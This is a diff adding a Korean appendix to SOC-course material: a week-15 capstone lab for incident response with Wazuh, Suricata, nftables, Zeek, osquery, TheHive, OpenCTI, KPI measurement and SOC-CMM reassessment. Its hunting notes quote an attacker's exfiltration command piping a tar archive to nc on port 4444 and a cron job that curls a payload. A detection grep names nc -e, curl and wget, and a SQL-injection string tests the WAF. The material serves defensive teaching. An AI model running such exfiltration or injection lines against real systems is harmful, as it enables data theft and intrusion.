@@ -1014,3 +1014,704 @@ graph LR
 
 **학생 액션**: SOC monthly report.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course14 SOC Advanced — Week 15 종합 실전·15주 통합·SOC-CMM 재평가)
+
+> 이 부록은 lab `soc-adv-ai/week15.yaml` (10 step + multi_task) 의 모든 명령을
+> 실제로 실행 가능한 형태로 정리한다. 15주 (week01~14) 학습한 SOC 심화 기술을
+> 종합 적용하는 모의 인시던트 대응. 환경 점검 → 외부 공격 시나리오 → 내부 비정상 →
+> 위협 헌팅 → IOC 통합 → KPI 측정 → SOC-CMM 재평가 → 최종 보고서.
+
+### lab step → 도구·통합 매핑 표
+
+| step | 학습 항목 | 사용 도구 (재사용 week) | 통합 영역 |
+|------|----------|----------------------|---------|
+| s1 | SOC 환경 점검 | Wazuh + Suricata + nft (w01·02) | Detection |
+| s2 | 시나리오 1 외부 공격 | Suricata eve.json + Wazuh + jq (w07·11) | Detection |
+| s3 | 시나리오 1 대응 | nft + Suricata + Wazuh AR (w10·11) | Containment |
+| s4 | 시나리오 2 내부 비정상 | Suricata + 시스템 log + 교차 (w06·07) | Detection + Hunting |
+| s5 | 위협 헌팅 (지속성) | osquery + Wazuh + auditd (w06) | Hunting |
+| s6 | IOC 통합 관리 | Wazuh CDB + Suricata reputation (w05·12) | TI |
+| s7 | Wazuh + Suricata 교차 | Dashboard + 다층 매트릭스 (w02·12) | Analysis |
+| s8 | KPI 측정 (MTTD/MTTR) | Grafana + Wazuh API (w01·02·12·14) | Metrics |
+| s9 | SOC-CMM 재평가 | radar chart + 5 도메인 (w01) | Maturity |
+| s10 | 최종 종합 보고서 | markdown + 15주 통합 + 향후 plan | - |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: 환경→공격→대응→내부→헌팅 | All |
+
+### 학생 환경 준비 (15주 도구 통합)
+
+```bash
+echo "=== Week 01: Wazuh / Suricata / nft ==="
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control status'
+ssh ccc@10.20.30.1 'suricata -V; sudo nft list ruleset | head'
+
+echo "=== Week 02: Custom rules ==="
+ssh ccc@10.20.30.100 'sudo grep -c "<rule" /var/ossec/etc/rules/local_rules.xml'
+
+echo "=== Week 03: SIGMA ==="
+sigma --version; ls ~/sigma-rules/rules/ 2>/dev/null
+
+echo "=== Week 04: YARA ==="
+yara --version; ls ~/yara-rules/ 2>/dev/null
+
+echo "=== Week 05: TI ==="
+curl -s http://10.20.30.100:8080/health 2>/dev/null
+
+echo "=== Week 06: 헌팅 ==="
+which jupyter; ls /tmp/atomic 2>/dev/null
+
+echo "=== Week 07: 네트워크 ==="
+which tcpdump tshark zeek nfdump
+
+echo "=== Week 08: 메모리 ==="
+ls /tmp/lime/src/lime-*.ko 2>/dev/null
+
+echo "=== Week 09: 악성코드 ==="
+which die; ls /tmp/cuckoo 2>/dev/null
+
+echo "=== Week 10: SOAR ==="
+curl -s http://192.168.0.103:8003/health
+docker ps | grep -E "(thehive|cortex|misp)"
+
+echo "=== Week 11: IR ==="
+ls /var/log/forensics/ 2>/dev/null
+
+echo "=== Week 12: 로그 엔지니어링 ==="
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-stats -m'
+
+echo "=== Week 13: Purple Team ==="
+ls /tmp/atomic/atomics/ 2>/dev/null
+
+echo "=== Week 14: AI ==="
+which mlflow; ls /var/ml/ 2>/dev/null
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: SOC 환경 점검 (Step 1)
+
+```bash
+TOKEN=$(curl -sk -u wazuh:wazuh -X POST "https://10.20.30.100:55000/security/user/authenticate?raw=true")
+
+# Wazuh
+curl -sk -H "Authorization: Bearer $TOKEN" "https://10.20.30.100:55000/cluster/healthcheck" | jq
+curl -sk -H "Authorization: Bearer $TOKEN" "https://10.20.30.100:55000/agents/summary/status" | jq
+curl -sk -H "Authorization: Bearer $TOKEN" "https://10.20.30.100:55000/rules?filename=local_rules.xml&limit=1" | jq '.data.total_affected_items'
+
+# Suricata
+ssh ccc@10.20.30.1 'suricata -V; sudo suricatasc -c uptime; sudo suricatasc -c rules-stats'
+
+# nftables
+ssh ccc@10.20.30.1 'sudo nft list ruleset'
+ssh ccc@10.20.30.1 'sudo nft list counter inet filter input_dropped 2>/dev/null'
+
+# OpenSearch
+curl -sk -u admin:admin "https://10.20.30.100:9200/_cluster/health" | jq
+
+# 종합
+cat > /tmp/soc-health-2026Q2.md << 'MD'
+# SOC Health Check — 2026-05-02
+
+## Wazuh
+- Manager: ✓ healthy
+- Active agents: 4/4
+- Total rules: 4847 + 23 custom
+- Recent alerts (1h): 145
+
+## Suricata
+- Version: 6.0.x
+- Uptime: 5d 3h
+- Active rules: 25,320
+
+## nftables
+- input policy: drop ✓
+- input_dropped: 12,483 packets
+
+## OpenSearch
+- Cluster: green
+- Indices: 47
+MD
+```
+
+#### 도구 2: 시나리오 1 — 외부 공격 (Step 2)
+
+```bash
+ssh ccc@10.20.30.1 'sudo jq -c "select(.event_type==\"alert\" and .alert.category | test(\"web\"; \"i\"))" /var/log/suricata/eve.json | tail -20'
+ssh ccc@10.20.30.1 'sudo jq -r "select(.event_type==\"alert\") | .src_ip" /var/log/suricata/eve.json | sort | uniq -c | sort -rn | head -10'
+
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H "Content-Type: application/json" -d '{
+  "size": 50,
+  "query": {"bool":{"must":[
+    {"range":{"@timestamp":{"gte":"now-1h"}}},
+    {"prefix":{"rule.id":"1002"}}]}},
+  "sort": [{"@timestamp":"desc"}]
+}' | jq '.hits.hits[]._source | {ts:.timestamp, src:.data.srcip, uri:.data.url, rule:.rule.description}'
+
+# TheHive case 자동
+THEHIVE=http://10.20.30.100:9000
+curl -X POST "$THEHIVE/api/v1/case" \
+  -H "Authorization: Bearer $API_KEY" \
+  -d '{"title":"[P1] External attack — web (10.20.30.80)",
+       "description":"Suricata + Wazuh 다수 SQLi/XSS from 192.168.1.50",
+       "severity":4, "tlp":2, "tags":["sqli","web","P1","external"]}'
+
+# 결과
+cat > /tmp/scenario1-analysis.md << 'MD'
+## Scenario 1 — External Attack on Web
+
+### 공격자 정보
+- IP: 192.168.1.50 / GeoIP: 한국 / VT: malicious 5/89
+
+### 공격 유형
+- SQLi: 47건, XSS: 12건, Directory traversal: 8건
+
+### 영향
+- Apache 4xx: 53건 / 200: 14건 (★ 14건 성공 의심)
+- DB query log: SELECT FROM users 6건
+
+### 결과: P1 Critical → TheHive case + T2 escalate
+MD
+```
+
+#### 도구 3: 시나리오 1 대응 (Step 3)
+
+```bash
+# 1. nft 차단
+ssh ccc@10.20.30.1 'sudo nft add rule inet filter input ip saddr 192.168.1.50 drop counter comment "scenario1-block"'
+
+# 2. Suricata 추가 룰
+ssh ccc@10.20.30.1 'sudo tee -a /etc/suricata/rules/local.rules' << 'RULES'
+alert ip 192.168.1.50 any -> any any (msg:"BLOCKED IP — 192.168.1.50 still trying"; \
+    sid:9999001; rev:1; classtype:trojan-activity;)
+RULES
+ssh ccc@10.20.30.1 'sudo suricatasc -c reload-rules'
+
+# 3. Wazuh 강화
+ssh ccc@10.20.30.100 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
+<rule id="100999" level="14">
+  <if_sid>100200</if_sid>
+  <srcip>192.168.1.50</srcip>
+  <description>Scenario 1 — Confirmed attacker still active</description>
+  <mitre><id>T1190</id></mitre>
+  <options>alert_by_email</options>
+</rule>
+XML
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+
+# 4. WAF (week11)
+ssh ccc@10.20.30.80 'sudo a2enmod security2'
+ssh ccc@10.20.30.80 'sudo sed -i "s/SecRuleEngine DetectionOnly/SecRuleEngine On/" /etc/modsecurity/modsecurity.conf'
+ssh ccc@10.20.30.80 'sudo systemctl reload apache2'
+
+# 5. 검증
+ssh ccc@10.20.30.1 'sudo nft list chain inet filter input | grep "scenario1-block"'
+curl -s "http://10.20.30.80/search?q=' OR 1=1--" -o /dev/null -w "%{http_code}\n"
+# 403 (WAF) 또는 connection refused
+
+# 6. SOAR (week10)
+curl -X POST http://192.168.0.103:8003/playbooks/scenario1-comprehensive/run \
+  -d '{"vars": {"SRCIP": "192.168.1.50"}}'
+
+# 7. case 마감
+curl -X PATCH "$THEHIVE/api/v1/case/$CASE_ID" \
+  -d '{"status":"Resolved","resolutionStatus":"TruePositive"}'
+```
+
+#### 도구 4: 시나리오 2 — 내부 비정상 Outbound (Step 4)
+
+```bash
+# Suricata flow
+ssh ccc@10.20.30.1 'sudo jq -c "select(.event_type==\"flow\" and .src_ip | startswith(\"10.20.30.\") and (.dest_ip | startswith(\"10.20.30.\") | not))" /var/log/suricata/eve.json | tail -20'
+
+# Zeek 대용량
+ssh ccc@10.20.30.1 'sudo zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes resp_bytes < /var/log/zeek/conn.log | awk "$1 ~ /^10\.20\.30\./ && $2 !~ /^10\.20\.30\./ && ($4 > 10485760 || $5 > 10485760)" | head'
+
+# 시스템 log 교차
+ssh ccc@10.20.30.80 'sudo ss -tunap | grep -v 127.0.0.1 | grep -v 10.20.30 | head'
+ssh ccc@10.20.30.80 'sudo grep -E "(curl|wget|nc -e|tar.*nc)" /home/*/.bash_history /root/.bash_history 2>/dev/null | tail'
+
+# 메모리 (week08)
+ssh ccc@10.20.30.80 'sudo cd /tmp/lime/src && sudo insmod lime-$(uname -r).ko "path=/tmp/mem.lime format=lime"'
+scp ccc@10.20.30.80:/tmp/mem.lime /var/log/forensics/scenario2-mem.lime
+vol3 -f /var/log/forensics/scenario2-mem.lime linux.netstat | head
+
+# 발견
+cat > /tmp/scenario2-hunt.md << 'MD'
+## Scenario 2 — Internal Outbound
+
+### 의심 통신
+- web → 192.168.1.50:4444 (Metasploit default)
+- 50MB outbound (1h)
+
+### Process 식별
+- ss: PID 5678 bash (★ 비정상)
+- bash history: tar -czf - /var/www | nc 192.168.1.50 4444
+- vol3 linux.netstat: bash → 192.168.1.50:4444 ESTABLISHED
+
+### 결론: Reverse shell + 데이터 유출 (T1041)
+### 다음:
+1. 호스트 격리 (nft drop in/out)
+2. 메모리 + 디스크 이미징 (week07·08)
+3. IOC 추출 → Wazuh CDB
+4. 다른 호스트 IOC scan
+MD
+```
+
+#### 도구 5: 위협 헌팅 (Step 5)
+
+```bash
+# Persistence (week06 도구 8)
+for host in 10.20.30.{1,80,100}; do
+    echo "=== $host ==="
+    ssh ccc@$host '
+      sudo crontab -l 2>/dev/null
+      sudo cat /etc/crontab
+      sudo find /etc/systemd/system -name "*.service" -newer /tmp/baseline -mtime -7 2>/dev/null
+      sudo find /home -name "authorized_keys" -newer /tmp/baseline 2>/dev/null
+      sudo find / -perm -4000 -newer /tmp/baseline -ls 2>/dev/null | head
+      sudo lsmod | head
+    '
+done
+
+# osquery
+sudo osqueryi << 'SQL'
+SELECT * FROM crontab WHERE (julianday('now') - julianday(modtime/86400 + 2440587.5)) < 7;
+SELECT path, mode, mtime FROM file
+  WHERE directory='/tmp' AND (mode LIKE '%5%%' OR mode LIKE '%7%%')
+    AND mtime > strftime('%s', 'now', '-7 days');
+SELECT process_envs.pid, process_envs.value FROM process_envs WHERE key='LD_PRELOAD';
+SQL
+
+# Wazuh hunting
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H 'Content-Type: application/json' -d '{
+  "size": 100,
+  "query": {"bool":{"must":[
+    {"range":{"@timestamp":{"gte":"now-7d"}}},
+    {"terms":{"rule.id":["5106","5402","5712","5715","550","100850","100851"]}}]}}
+}' | jq '.hits.hits[]._source | {ts:.timestamp, rule:.rule.description, src:.data.srcip}'
+
+cat > /tmp/hunting-results.md << 'MD'
+## Hunting Results
+
+### 발견
+- web (/etc/cron.d/backup): 신규 — 5분마다 curl 192.168.1.50/payload
+- web (/home/ccc/.ssh/authorized_keys): attacker@kali ★
+- siem (/etc/systemd/system/persist.service): 신규 — bash reverse shell
+
+### Scope: web, siem (lateral 의심)
+
+### 다음
+1. persistence 모두 제거
+2. 자격증명 회전
+3. 다른 호스트 동일 헌팅
+MD
+```
+
+#### 도구 6: IOC 통합 (Step 6)
+
+```bash
+cat > /tmp/today-iocs.txt << 'IOC'
+192.168.1.50:c2
+192.168.1.51:c2
+evil-c2.example:phishing
+fake-bank.com:phishing
+0123456789abcdef0123456789abcdef:malware_hash
+IOC
+
+# Wazuh CDB
+ssh ccc@10.20.30.100 'sudo cat > /var/ossec/etc/lists/today-iocs' < /tmp/today-iocs.txt
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-make_cdb /var/ossec/etc/lists/today-iocs'
+ssh ccc@10.20.30.100 'sudo grep "today-iocs" /var/ossec/etc/ossec.conf || sudo sed -i "/<\/ruleset>/i \  <list>etc/lists/today-iocs<\/list>" /var/ossec/etc/ossec.conf'
+
+ssh ccc@10.20.30.100 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
+<rule id="999100" level="14">
+  <list field="srcip" lookup="address_match_key">etc/lists/today-iocs</list>
+  <description>Today IOC match — known attacker</description>
+  <mitre><id>T1071</id></mitre>
+</rule>
+XML
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+
+# Suricata reputation
+ssh ccc@10.20.30.1 'sudo cat > /etc/suricata/iprep/today.list' << 'REP'
+192.168.1.50,1,90
+192.168.1.51,1,85
+REP
+ssh ccc@10.20.30.1 'sudo cat > /etc/suricata/rules/today-iocs.rules' << 'RULES'
+alert ip $HOME_NET any -> $EXTERNAL_NET any (msg:"Today IOC C2"; iprep:dst,c2,>,80; sid:9999100; rev:1;)
+alert dns $HOME_NET any -> any any (msg:"Today IOC phishing"; dns_query; content:"evil-c2.example"; nocase; sid:9999101; rev:1;)
+RULES
+ssh ccc@10.20.30.1 'sudo suricatasc -c reload-rules'
+
+# OpenCTI export (week05)
+python3 << 'PY'
+from pycti import OpenCTIApiClient
+import stix2
+
+client = OpenCTIApiClient(url="http://10.20.30.100:8080", token="...")
+
+indicators = []
+for ip in ["192.168.1.50","192.168.1.51"]:
+    indicators.append(stix2.Indicator(
+        pattern_type="stix",
+        pattern=f"[ipv4-addr:value = '{ip}']",
+        indicator_types=["malicious-activity"],
+        valid_from="2026-05-02T00:00:00Z",
+        confidence=85,
+        labels=["c2","scenario1"]
+    ))
+
+bundle = stix2.Bundle(objects=indicators)
+client.stix2.import_bundle(bundle.serialize(), update=True)
+print(f"Pushed {len(indicators)} IOCs")
+PY
+```
+
+#### 도구 7: Wazuh + Suricata 교차 분석 (Step 7)
+
+```bash
+# Wazuh Dashboard 의 Suricata 알림
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H "Content-Type: application/json" -d '{
+  "size": 50,
+  "query": {"bool":{"must":[
+    {"range":{"@timestamp":{"gte":"now-1h"}}},
+    {"prefix":{"location":"/var/log/suricata"}}]}}
+}' | jq '.hits.hits[]._source | {ts:.timestamp, src:.data.src_ip, sig:.data.alert.signature}'
+
+# 5-tuple 매칭
+SRC_IP="192.168.1.50"
+echo "=== Wazuh ==="
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H 'Content-Type: application/json' -d "{
+  \"size\":20, \"query\":{\"bool\":{\"must\":[
+    {\"range\":{\"@timestamp\":{\"gte\":\"now-1h\"}}},
+    {\"term\":{\"data.srcip\":\"$SRC_IP\"}}]}}
+}" | jq '.hits.hits[]._source | {ts:.timestamp, rule:.rule.description}'
+
+echo "=== Suricata via Wazuh ==="
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H 'Content-Type: application/json' -d "{
+  \"size\":20, \"query\":{\"bool\":{\"must\":[
+    {\"range\":{\"@timestamp\":{\"gte\":\"now-1h\"}}},
+    {\"term\":{\"data.src_ip\":\"$SRC_IP\"}}]}}
+}" | jq '.hits.hits[]._source | {ts:.timestamp, sig:.data.alert.signature}'
+
+# Combo 룰 (week02 의 100600)
+ssh ccc@10.20.30.100 'sudo grep -A 8 "100600" /var/ossec/etc/rules/local_rules.xml'
+```
+
+#### 도구 8: KPI 측정 (Step 8)
+
+```bash
+# MTTD
+EVENT_TIME="2026-05-02T14:00:01Z"
+ALERT_TIME=$(curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_search" -H 'Content-Type: application/json' -d "{
+  \"size\":1, \"query\":{\"bool\":{\"must\":[
+    {\"term\":{\"data.srcip\":\"192.168.1.50\"}}]}}, \"sort\":[{\"@timestamp\":\"asc\"}]
+}" | jq -r '.hits.hits[0]._source["@timestamp"]')
+
+python3 -c "
+from datetime import datetime
+e = datetime.fromisoformat('$EVENT_TIME'.replace('Z','+00:00'))
+a = datetime.fromisoformat('$ALERT_TIME'.replace('Z','+00:00'))
+print(f'MTTD: {(a-e).total_seconds():.1f}s')
+"
+
+# MTTR
+CONTAINMENT_TIME="2026-05-02T14:08:00Z"
+python3 -c "
+from datetime import datetime
+a = datetime.fromisoformat('$ALERT_TIME'.replace('Z','+00:00'))
+c = datetime.fromisoformat('$CONTAINMENT_TIME'.replace('Z','+00:00'))
+print(f'MTTR: {(c-a).total_seconds()/60:.1f}분')
+"
+
+# 처리 알림 (24h)
+curl -sk -u admin:admin "https://10.20.30.100:9200/wazuh-alerts-*/_count?q=@timestamp:%5Bnow-24h%20TO%20now%5D" | jq .count
+
+# 인시던트
+curl -X GET "$THEHIVE/api/v1/case" -d '{"query":{"_field":"createdAt","_gte":"2026-05-02T00:00:00Z"}}' | jq '.length'
+```
+
+| KPI | 측정값 | 목표 | 결과 |
+|-----|--------|------|------|
+| MTTD | 5s | < 60s | ✓ |
+| MTTR | 8분 | < 30분 | ✓ |
+| 처리 알림 (24h) | 1,847 | - | - |
+| 인시던트 (24h) | 12 (P1:1, P2:3, P3:8) | - | - |
+| 자동 차단 | 24 | - | - |
+| FP rate | 4% | < 5% | ✓ |
+| ATT&CK Coverage | 56% | > 30% | ✓ |
+| Wazuh EPS | 5,234 avg | < 10K | ✓ |
+| Latency p95 | 2.3s | < 5s | ✓ |
+
+#### 도구 9: SOC-CMM 재평가 (Step 9)
+
+```python
+import matplotlib.pyplot as plt
+import numpy as np
+
+before = {"Business":2.5,"People":2.8,"Process":2.0,"Technology":2.3,"Services":2.7}
+after = {"Business":3.2,"People":3.5,"Process":3.4,"Technology":3.6,"Services":3.4}
+
+before_avg = sum(before.values()) / len(before)
+after_avg = sum(after.values()) / len(after)
+
+print("=== SOC-CMM Maturity Re-assessment ===")
+print(f"{'Domain':<15} {'Before':>8} {'After':>8} {'Δ':>6}")
+print("-" * 45)
+for d in before:
+    print(f"{d:<15} {before[d]:>8.1f} {after[d]:>8.1f} {after[d]-before[d]:>+6.1f}")
+print(f"{'Overall':<15} {before_avg:>8.2f} {after_avg:>8.2f} {after_avg-before_avg:>+6.2f}")
+
+# Radar chart
+domains = list(before.keys())
+b_scores = list(before.values())
+a_scores = list(after.values())
+target = [4] * len(domains)
+
+angles = np.linspace(0, 2*np.pi, len(domains), endpoint=False).tolist()
+b_scores += b_scores[:1]; a_scores += a_scores[:1]; target += target[:1]; angles += angles[:1]
+
+fig, ax = plt.subplots(figsize=(8,8), subplot_kw=dict(polar=True))
+ax.plot(angles, b_scores, 'o-', linewidth=2, label='Week 1', color='#888')
+ax.plot(angles, a_scores, 'o-', linewidth=2, label='Week 15', color='#3b82f6')
+ax.fill(angles, a_scores, alpha=0.25, color='#3b82f6')
+ax.plot(angles, target, 'o-', linewidth=2, label='Target L4', color='#ef4444', linestyle='--')
+
+ax.set_xticks(angles[:-1]); ax.set_xticklabels(domains)
+ax.set_ylim(0,5); ax.set_yticks([1,2,3,4,5])
+ax.set_yticklabels(['L1','L2','L3','L4','L5'])
+ax.legend(loc='upper right', bbox_to_anchor=(1.3, 1.1))
+plt.title('SOC-CMM 변화 — Week 1 vs Week 15', pad=20)
+plt.savefig('/tmp/socmm-comparison.png', dpi=150, bbox_inches='tight')
+```
+
+```
+=== 결과 ===
+Week 1: 2.46 (L1-L2 사이)
+Week 15: 3.42 (L3 가까움) (+0.96)
+
+가장 큰 변화:
+- Process: 2.0 → 3.4 (+1.4) ★ IR / 헌팅 / Purple Team 절차
+- Technology: 2.3 → 3.6 (+1.3) ★ SIGMA / YARA / LLM / MLOps
+
+여전한 갭 (Target L4):
+- Business: 3.2 (Charter / Funding 더 정립)
+- Services: 3.4 (TI + Threat Hunting 정규화)
+```
+
+#### 도구 10: 최종 종합 보고서 (Step 10)
+
+```bash
+cat > /tmp/soc_final_report.txt << 'EOF'
+================================================================
+SOC Final Report — Course14 SOC Advanced 15주 통합
+================================================================
+작성: 2026-05-02
+
+## 1. Executive Summary
+- 15주 SOC 심화 수료
+- SOC-CMM: 2.46 → 3.42 (+0.96)
+- 도구: 28+ OSS 풀스택
+- 룰: Wazuh 23 + SIGMA 47 + YARA 87 + Suricata 89 = 246 신규
+- ATT&CK Coverage: 21% → 56% (+35pt)
+
+## 2. 학습 영역별 성과
+- Week 1: SOC-CMM 5 도메인 baseline
+- Week 2: Wazuh 23 사용자 룰 + correlation
+- Week 3: SIGMA 47 룰 + 4 backend 변환
+- Week 4: YARA 87 룰 + Wazuh AR 통합
+- Week 5: TI (STIX 2.1 + MISP + OpenCTI) + 28K IOC
+- Week 6: 6 헌팅 노트북 + HMM L1→L2
+- Week 7: tcpdump + Zeek + Plaso + CoC
+- Week 8: LiME + Volatility + rootkit 탐지
+- Week 9: Cuckoo + DIE + IOC 자동화
+- Week 10: 10 SOAR playbook + ROI 240%
+- Week 11: NIST SP 800-61 r2 + Tabletop + AAR
+- Week 12: decoder + 정규화 + ILM + ATT&CK 37%
+- Week 13: Purple Team + Coverage 37%→56%
+- Week 14: AI SOC L0→L1 (12개월 L3 목표)
+- Week 15: 종합 시뮬
+
+## 3. SOC-CMM 변화 (2.46 → 3.42)
+| Domain | Before | After | Δ |
+|--------|--------|-------|---|
+| Business | 2.5 | 3.2 | +0.7 |
+| People | 2.8 | 3.5 | +0.7 |
+| Process | 2.0 | 3.4 | +1.4 ★ |
+| Technology | 2.3 | 3.6 | +1.3 ★ |
+| Services | 2.7 | 3.4 | +0.7 |
+
+## 4. KPI (시뮬)
+- MTTD: 5s ✓ / MTTR: 8분 ✓ / FP: 4% ✓
+- Coverage: 56% / EPS: 5K / Latency p95: 2.3s
+
+## 5. 향후 로드맵 (12개월)
+- Q3: Cloud SOC + IoT + Wazuh cluster
+- Q4: AI L2 + HMM L3 + Bug Bounty
+- 2027 Q1: AI L3 (MLOps) + 24x7 + Compliance 자동화
+- 2027 Q2: AI L4 (자율) + 분기 외부 pentest
+
+## 6. 도구 카탈로그 (28+)
+[15주 통합 도구 매트릭스]
+
+## 7. 자기 평가
+### 강점
+- 다층 탐지 (rule + AI + UEBA)
+- IR 정형화 (NIST SP 800-61)
+- TI 통합 자동화
+- Detection-as-Code
+
+### 개선 필요
+- AI 모델 운영 (pilot 수준)
+- Cloud SOC 부족
+- 24x7 운영 부족
+
+### 다음 과정
+- course13 attack-advanced (Red Team)
+- course15 ai-safety-advanced (AI 보안)
+- course17 iot-security
+- 외부 OSCP
+
+## 8. Lessons Learned
+1. OSS 만으로 enterprise SOC 가능
+2. 자동화 ROI 240% (10 playbook)
+3. TI + Detection 시너지
+4. Purple Team 가장 효과적 (분기 +5%)
+5. AI 도입 단계적 (18개월)
+6. 사람이 핵심
+
+## 9. 부록
+- A. 작성된 모든 룰 (전문)
+- B. SOC-CMM radar chart
+- C. ATT&CK Coverage Navigator JSON
+- D. KPI dashboard
+- E. Jupyter 노트북 (6개)
+- F. SOAR playbook (10개)
+- G. Purple Team AAR
+EOF
+
+pandoc /tmp/soc_final_report.txt -o /tmp/soc_final_report.pdf \
+  --pdf-engine=xelatex --toc -V mainfont="Noto Sans CJK KR"
+
+echo "최종 보고서: /tmp/soc_final_report.pdf"
+```
+
+### 점검 / 시뮬 / 측정 흐름 (10 step + multi_task)
+
+#### Phase A — 환경 + 시나리오 (s1·s2·s3)
+
+```bash
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control status'
+ssh ccc@10.20.30.1 'sudo jq -r "select(.event_type==\"alert\") | .src_ip" /var/log/suricata/eve.json | sort | uniq -c | sort -rn | head'
+ssh ccc@10.20.30.1 'sudo nft add rule inet filter input ip saddr 192.168.1.50 drop counter'
+```
+
+#### Phase B — 헌팅 + IOC + 교차 (s4·s5·s6·s7)
+
+```bash
+ssh ccc@10.20.30.1 'sudo zeek-cut id.orig_h id.resp_h orig_bytes < /var/log/zeek/conn.log | awk "$3 > 10485760"'
+sudo osqueryi << 'SQL'
+SELECT * FROM crontab; SELECT path, mtime FROM file WHERE path LIKE '/home/%/.bashrc';
+SQL
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-make_cdb /var/ossec/etc/lists/today-iocs'
+```
+
+#### Phase C — KPI + 재평가 + 보고 (s8·s9·s10)
+
+```bash
+python3 /tmp/measure-kpi.py
+python3 /tmp/socmm-reassess.py
+pandoc /tmp/soc_final_report.txt -o /tmp/soc_final_report.pdf \
+  --pdf-engine=xelatex --toc -V mainfont="Noto Sans CJK KR"
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 가 한 번에:
+
+1. **plan**: 환경 점검 → 시나리오 1 분석 → 대응 → 시나리오 2 분석 → 헌팅
+2. **execute**: Wazuh API + Suricata jq + nft + zeek + osquery
+3. **synthesize**: 5 산출물 (health.md / scenario1.md / containment.md / scenario2.md / hunting.md)
+
+### 도구 비교표 — 15주 통합 카탈로그
+
+| 카테고리 | 핵심 OSS | 학습 week |
+|---------|---------|-----------|
+| SIEM | Wazuh | w01·02·12 |
+| NIDS | Suricata + Zeek | w01·07·12 |
+| HIDS / 헌팅 | osquery + auditd + Wazuh | w06·08 |
+| Rule (multi-vendor) | SIGMA + sigma-cli | w03 |
+| Malware detect | YARA + Loki | w04·09 |
+| TI | OpenCTI + MISP + Cortex | w05 |
+| 메모리 | LiME + Volatility 3 | w08 |
+| PCAP | tcpdump + Wireshark + Stenographer | w07 |
+| Timeline | Plaso + Timesketch | w07·11 |
+| Sandbox | Cuckoo + CAPE | w09 |
+| SOAR | TheHive + Cortex + Bastion | w10 |
+| WAF | ModSecurity OWASP CRS | w11 |
+| Audit | auditd + osquery | w12 |
+| Logs | rsyslog + Logstash + Vector | w12 |
+| Forensic | foremost + binwalk + Sleuth Kit | w07 |
+| Anti-rootkit | chkrootkit + rkhunter + unhide | w08 |
+| Purple Team | Atomic Red Team + DeTT&CT | w13 |
+| AI / ML | scikit-learn + Ollama + MLflow | w14 |
+| 시각화 | Grafana + Prometheus + Wazuh Dashboard | w12 |
+| ATT&CK | Navigator + DeTT&CT + sigma2attack | w03·06·11·12·13 |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "처음 SOC 도입" | Wazuh + Suricata + TheHive | OSS 풀스택 |
+| "TI 자동화" | OpenCTI + MISP + Cortex | 표준 |
+| "SOAR" | TheHive + Cortex + Bastion | OSS |
+| "Purple Team" | Atomic Red Team + DeTT&CT | 분기 |
+| "incident response" | Wazuh + Plaso + Timesketch + LiME | 표준 |
+| "악성코드" | Cuckoo + DIE + YARA + Volatility | depth |
+| "헌팅" | Jupyter + Wazuh API + Zeek + osquery | 가설 |
+| "AI 도입" | scikit-learn + Ollama + MLflow | 단계적 |
+| "compliance" | NIST SP 800-61 r2 + 양식 + audit log | 표준 |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: Wazuh + Suricata + nft + OpenSearch 4 health + 종합 markdown
+- [ ] s2: Suricata + Wazuh + Apache 교차 + TheHive case 자동
+- [ ] s3: nft + Suricata 룰 + Wazuh 강화 + WAF + 검증
+- [ ] s4: Suricata flow + Zeek conn + ss + bash history + 메모리
+- [ ] s5: 6 종 persistence + osquery
+- [ ] s6: Wazuh CDB + Suricata reputation + OpenCTI STIX
+- [ ] s7: 5-tuple 매칭 + Wazuh Dashboard + 100600 combo
+- [ ] s8: MTTD + MTTR + 처리량 + 인시던트 + FP rate
+- [ ] s9: SOC-CMM 5 도메인 Before vs After + radar + Δ
+- [ ] s10: `/tmp/soc_final_report.txt` 9 섹션 + PDF
+- [ ] s99: Bastion 가 5 작업 (환경/공격/대응/내부/헌팅) 순차
+
+### 추가 참조 자료 (15주 통합)
+
+- **NIST SP 800-61 r2** Computer Security Incident Handling Guide
+- **NIST SP 800-86** Forensic Techniques
+- **NIST SP 800-92** Log Management
+- **NIST SP 800-115** Security Testing
+- **MITRE ATT&CK** https://attack.mitre.org/
+- **MITRE D3FEND** https://d3fend.mitre.org/
+- **SOC-CMM** https://www.soc-cmm.com/
+- **Wazuh** https://wazuh.com/
+- **Suricata** https://suricata.io/
+- **TheHive Project** https://thehive-project.org/
+- **OpenCTI** https://www.opencti.io/
+- **Sigma** https://github.com/SigmaHQ/sigma
+- **YARA** https://virustotal.github.io/yara/
+- **Volatility** https://volatility3.readthedocs.io/
+- **Plaso** https://plaso.readthedocs.io/
+- **Atomic Red Team** https://github.com/redcanaryco/atomic-red-team
+- **DeTT&CT** https://github.com/rabobank-cdc/DeTTECT
+- **MITRE Adversary Emulation Library** https://github.com/center-for-threat-informed-defense/adversary_emulation_library
+- **Practical Threat Detection Engineering** Megan Roddie 등 2023
+- **The Threat Hunting Project** Sqrrl 2016
+
+위 모든 종합 실전은 **15주 통합 + 사전 동의 + RoE** 로 수행한다. 시뮬은 격리 lab
